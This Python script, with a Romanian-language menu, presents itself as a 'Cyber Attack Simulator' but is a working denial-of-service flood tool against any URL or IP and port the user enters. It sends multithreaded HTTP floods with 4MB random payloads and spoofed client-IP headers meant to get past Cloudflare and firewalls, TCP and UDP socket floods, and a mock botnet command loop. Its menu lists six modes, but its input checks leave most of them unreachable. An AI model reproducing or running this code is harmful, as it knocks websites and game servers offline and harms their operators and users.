import requests
import threading
import time
import random
import socket
import ssl
import os
import json
import base64

print("""\033[91m
   ##
   ###
    ####
     #####
     #######
      #######
      ########
      ########
      #########
      ##########
     ############
   ##############
  ################
   ################
     ##############
      ##############                                              ####
      ##############                                           #####
       ##############                                      #######
       ##############                                 ###########
       ###############                              #############
       ################                           ##############
      #################      #                  ################
      ##################     ##    #           #################
     ####################   ###   ##          #################
          ################  ########          #################
           ################  #######         ###################
             #######################       #####################
              #####################       ###################
                ############################################
                 ###########################################
                 ##########################################
                  ########################################
                  ########################################
                   ######################################
                   ######################################
                    ##########################      #####
                    ###  ###################           ##
                    ##    ###############
                    #     ##  ##########   
                              ##    ###
                                    ###
                                    ##\033
                                    #                          By Nobil.Sec""")


print("\n\033[92m*** Bine ai venit la Cyber Attack Simulator! ***\033")
print("\033[94mAlege-ți arma digitală din arsenalul nostru impresionant:\033")
print("\033[93m+---------------------------------------------------------------+\033")
print("\033[93m| \033[94mNr. \033[93m| \033[94mDescriere                                           |\033")
print("\033[93m+---------------------------------------------------------------+\033")
print("\033[93m| \033[94m1.  \033[93m| \033[95mLayer 7 (HTTP/HTTPS) pentru URL                      |\033")
print("\033[93m| \033[94m2.  \033[93m| \033[95mLayer 4 (TCP/UDP) pentru IP și port                |\033")
print("\033[93m| \033[94m3.  \033[93m| \033[95mLayer 7 Bypass Cloudflare/Firewall (HTTP/HTTPS) pentru URL|\033")
print("\033[93m| \033[94m4.  \033[93m| \033[95mLayer 4 Bypass Firewall (TCP/UDP) pentru IP și port |\033")
print("\033[93m| \033[94m5.  \033[93m| \033[95mMinecraft Server Attack (TCP/UDP) pentru IP și port |\033")
print("\033[93m| \033[94m6.  \033[93m| \033[95mFiveM Server Attack (TCP/UDP) pentru IP și port    |\033")
print("\033[93m+---------------------------------------------------------------+\033")
mode = input("\033[96mIntrodu numărul modului (1-6): \033")

target_url = ""
target_ip = ""
target_port = ""

if mode == "1":
    target_url = input("\033[92mIntrodu link-ul URL (ex: http://site.com): \033")
elif mode == "2":
    target_ip = input("\033[92mIntrodu adresa IP: \033")
    target_port = input("\033[92mIntrodu portul: \033")
else:
    print("\033[91mMod invalid. Iesire.\033")
    exit(1)

def get_random_headers():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36', 
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
        'Aternos Client/1.0',
        'Minecraft/1.19.2'
    ]
    
    headers = {
        'User-Agent': random.choice(user_agents),
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'CF-IPCountry': random.choice(['US', 'GB', 'DE', 'FR']),
        'CF-Connecting-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
        'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
        'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
        # Headers pentru bypass firewall
        'X-Originating-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
        'X-Remote-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
        'X-Remote-Addr': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
        'X-Client-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
        'True-Client-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
    }
    return headers

def generate_large_data():
    # Generează date aleatorii de aproximativ 4MB pentru un impact mai mare
    return os.urandom(4 * 1024 * 1024)  # 4MB de date aleatorii

def minecraft_ping(ip, port):
    # Minecraft server ping cu date foarte mari
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    try:
        sock.connect((ip, int(port)))
        # Trimite pachete foarte mari de date, de mai multe ori
        for _ in range(4):
            large_data = generate_large_data()
            sock.sendall(large_data)
        sock.close()
    except:
        pass

def layer7_attack():
    while True:
        try:
            headers = get_random_headers()
            for _ in range(4):
                large_data = generate_large_data()
                req_type = random.randint(1,6)
                if req_type == 1:
                    requests.post(target_url, headers=headers, data=large_data, timeout=2, verify=False)
                elif req_type == 2:
                    requests.put(target_url, headers=headers, data=large_data, timeout=2, verify=False)
                elif req_type == 3:
                    # Pentru layer 7, nu folosim minecraft_ping
                    requests.get(target_url, headers=headers, timeout=2, verify=False)
                elif req_type == 4:
                    session = requests.Session()
                    session.headers = headers
                    session.verify = False
                    session.post(target_url, data=large_data, timeout=2)
                elif req_type == 5:
                    requests.head(target_url, headers=headers, timeout=2, verify=False)
                else:
                    requests.options(target_url, headers=headers, timeout=2, verify=False)
            print(f"Layer 7: Trimis pachet de date: ~16MB (4x4MB)")
        except Exception as e:
            pass

def layer4_attack():
    while True:
        try:
            # Trimite 4 pachete mari pe fiecare cerere pentru a crește puterea
            for _ in range(4):
                large_data = generate_large_data()
                req_type = random.randint(1,3)
                if req_type == 1:
                    # TCP flood
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    try:
                        sock.connect((target_ip, int(target_port)))
                        sock.sendall(large_data)
                        sock.close()
                    except:
                        pass
                elif req_type == 2:
                    # UDP flood
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    try:
                        sock.sendto(large_data, (target_ip, int(target_port)))
                        sock.close()
                    except:
                        pass
                else:
                    # Minecraft ping ca in original
                    minecraft_ping(target_ip, target_port)
            print(f"Layer 4: Trimis pachet de date: ~16MB (4x4MB)")
        except Exception as e:
            pass

def get_command_from_c2():
    try:
        # Simulate getting commands from C2 server
        # In a real scenario, this would be an encrypted connection to your C2 server
        commands = {
            "attack": {
                "target": target_url,
                "duration": 60,  # seconds
                "method": "http"
            },
            "stop": {
                "action": "stop"
            }
        }
        return random.choice(list(commands.keys()))
    except:
        return "stop"

def execute_command(command):
    if command == "attack":
        print("\033[92m[*] Starting attack...\033")
        start_time = time.time()
        while time.time() - start_time < 60:  # Run for 60 seconds
            try:
                headers = get_random_headers()
                for _ in range(4):
                    large_data = generate_large_data()
                    req_type = random.randint(1,6)
                    if req_type == 1:
                        requests.post(target_url, headers=headers, data=large_data, timeout=2, verify=False)
                    elif req_type == 2:
                        requests.put(target_url, headers=headers, data=large_data, timeout=2, verify=False)
                    elif req_type == 3:
                        requests.get(target_url, headers=headers, timeout=2, verify=False)
                    elif req_type == 4:
                        session = requests.Session()
                        session.headers = headers
                        session.verify = False
                        session.post(target_url, data=large_data, timeout=2)
                    elif req_type == 5:
                        requests.head(target_url, headers=headers, timeout=2, verify=False)
                    else:
                        requests.options(target_url, headers=headers, timeout=2, verify=False)
                print(f"\033[92m[*] Botnet: Sent packet: ~16MB (4x4MB)\033")
                time.sleep(0.1)
            except Exception as e:
                print(f"\033[91m[!] Error: {str(e)}\033")
    elif command == "stop":
        print("\033[91m[!] Attack stopped by C2 command.\033")
        return False
    return True

def register_bot():
    # Simulate bot registration with a unique ID
    bot_id = ''.join(random.choices('0123456789abcdef', k=8))
    print(f"\033[92m[*] Bot registered with ID: {bot_id}\033")
    return bot_id

def distribute_command(bot_id, command):
    # Simulate command distribution to a specific bot
    print(f"\033[93m[*] Distributing command '{command}' to bot {bot_id}\033")
    return command

def botnet_attack():
    bot_id = register_bot()
    while True:
        try:
            command = get_command_from_c2()
            distributed_command = distribute_command(bot_id, command)
            if not execute_command(distributed_command):
                break
        except Exception as e:
            print(f"\033[91m[!] Error in botnet: {str(e)}\033")
            time.sleep(1)

# Dezactivează avertismentele SSL
requests.packages.urllib3.disable_warnings()

num_threads = 100  # More realistic number of threads
threads = []

if mode == "1":
    attack_func = layer7_attack
elif mode == "2":
    attack_func = layer4_attack
elif mode == "3":
    attack_func = botnet_attack
else:
    print("\033[91mMod invalid. Iesire.\033")
    exit(1)

print("\033[92m[*] Starting botnet with command-based system...\033")
print("\033[93m[*] Available commands: attack, stop\033")

for _ in range(num_threads):
    thread = threading.Thread(target=attack_func)
    thread.daemon = True
    threads.append(thread)
    thread.start()

# Menține programul în execuție
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\033[91m[!] Program oprit de utilizator\033")
